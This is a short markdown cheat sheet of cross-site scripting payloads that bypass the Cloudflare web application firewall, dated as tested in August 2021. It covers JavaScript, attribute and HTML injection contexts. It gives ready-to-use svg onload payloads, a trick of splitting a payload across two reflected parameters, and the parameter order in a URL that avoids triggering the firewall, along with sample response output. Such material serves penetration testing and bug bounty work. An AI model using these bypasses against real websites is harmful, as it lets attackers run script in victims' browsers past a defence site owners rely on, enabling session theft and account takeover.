# CloudFlare XSS bypasses in different contexts

### JS Context

For **JS** context, when multiple parameters are reflected inside **<script>** tag e.g:
```
<script>
something({"some/thing":{"key":[{"name":"PARAM2_REFLECTION1","age":"","country":"","address1":"PARAM1_REFLECTION2","id":"123"}]}});
</script>
```

Set value of parameter which is reflected first: `</script%20`

Set value of parameter which is reflected afterwards: `><svg/oni=on onload=confirm(2)>`

The parameter which is reflected first, should be placed at end of URL, like:

`https://example[.]com/some/endpoint?param1=%3E%3Csvg%2Foni%3Don%20onload%3Dconfirm(2)%3E&param2=</script%20`

If it is placed before like folllowing, Cloudflare WAF will trigger:

`https://example[.]com/some/endpoint?param2=</script%20&param1=%3E%3Csvg%2Foni%3Don%20onload%3Dconfirm(2)%3E`

Sample Response contents:
```
<script>
something({"some/thing":{"key":[{"name":"</script ","age":"","country":"","address1":"><svg/oni=on onload=confirm(2)>","id":"123"}]}});
</script>
```

### Attribute Context

For Attribute context use:
```
"><svg/oni=on onload=confirm(2)>
'><svg/oni=on onload=confirm(2)>
```

### HTML Context

For HTML context use:

`<svg/oni=on onload=confirm(2)>`

Credits for XSS bypass in HTML context: [Troll_13](https://twitter.com/Troll_13/status/1353713311972552709)

---

Bypasses tested on: `August 26, 2021`